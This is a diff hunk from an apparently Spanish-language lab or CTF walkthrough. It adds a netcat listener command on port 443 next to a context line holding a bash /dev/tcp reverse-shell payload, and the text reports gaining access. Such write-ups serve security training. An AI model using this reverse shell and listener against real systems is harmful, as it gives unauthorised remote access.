@@ -84,6 +84,10 @@ os.system("bash -i &> /dev/tcp/<IP>/<PUERTO> 0>&1")
 
 Nos ponemos en escucha por el puerto 443 usando netcat:
 
+```
+netcat -lvnp 443
+```
+
 ![http](Imagenes/7.png)
 
 Comprobamos que conseguimos el acceso:
